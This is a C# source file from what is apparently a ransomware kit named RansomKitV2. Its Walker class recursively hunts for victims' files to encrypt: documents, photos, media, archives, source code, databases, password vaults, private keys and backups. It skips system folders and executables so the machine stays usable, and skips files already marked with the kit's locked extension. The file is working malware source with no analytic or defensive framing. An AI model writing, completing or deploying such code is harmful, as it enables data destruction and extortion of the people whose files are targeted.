using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace RansomKitV2
{
    internal static class Walker
    {
        private static readonly HashSet<string> TargetExtensions = new(StringComparer.OrdinalIgnoreCase)
        {
            ".txt",".doc",".docx",".xls",".xlsx",".ppt",".pptx",".pdf",".rtf",".odt",
            ".jpg",".jpeg",".png",".gif",".bmp",".tiff",".webp",".svg",
            ".mp3",".wav",".flac",".aac",".ogg",".m4a",
            ".mp4",".mkv",".avi",".mov",".wmv",".webm",
            ".zip",".rar",".7z",".tar",".gz",".bz2",
            ".cs",".cpp",".c",".h",".hpp",".py",".js",".ts",".java",".go",".rs",".rb",".php",
            ".sql",".db",".sqlite",".mdb",".accdb",
            ".psd",".ai",".eps",".indd",".sketch",
            ".kdbx",".pem",".pfx",".key",".ovpn",
            ".bak",".old",".backup",".save",".dat",
        };

        private static readonly HashSet<string> SkipDirs = new(StringComparer.OrdinalIgnoreCase)
        {
            "Windows","WinSxS","System32","SysWOW64",
            "Program Files","Program Files (x86)","ProgramData",
            "AppData","$Recycle.Bin","System Volume Information",
            "Recovery","PerfLogs","Boot",
            "node_modules",".git",".vs","bin","obj","packages",
        };

        private static readonly HashSet<string> SkipExtensions = new(StringComparer.OrdinalIgnoreCase)
        {
            ".exe",".dll",".sys",".drv",".ocx",".mui",".lnk",".tmp",".lock",
            CryptoEngine.LockedExtension,
        };

        public static List<string> Walk(IEnumerable<string> roots)
        {
            var results = new List<string>();
            foreach (var root in roots)
            {
                if (string.IsNullOrEmpty(root)) continue;
                try
                {
                    if (File.Exists(root))
                    {
                        if (ShouldTake(root)) results.Add(root);
                        continue;
                    }
                    if (!Directory.Exists(root)) continue;

                    var stack = new Stack<string>();
                    stack.Push(root);
                    while (stack.Count > 0)
                    {
                        string dir = stack.Pop();
                        DirectoryInfo di;
                        try { di = new DirectoryInfo(dir); } catch { continue; }
                        if (SkipDirs.Contains(di.Name)) continue;

                        try
                        {
                            foreach (var sub in di.EnumerateDirectories())
                            {
                                if (sub.Attributes.HasFlag(FileAttributes.ReparsePoint)) continue;
                                stack.Push(sub.FullName);
                            }
                        }
                        catch { }

                        try
                        {
                            foreach (var f in di.EnumerateFiles())
                                if (ShouldTake(f.FullName)) results.Add(f.FullName);
                        }
                        catch { }
                    }
                }
                catch { }
            }
            return results.Distinct(StringComparer.OrdinalIgnoreCase).ToList();
        }

        private static bool ShouldTake(string path)
        {
            string ext = Path.GetExtension(path);
            if (SkipExtensions.Contains(ext)) return false;
            return TargetExtensions.Contains(ext);
        }
    }
}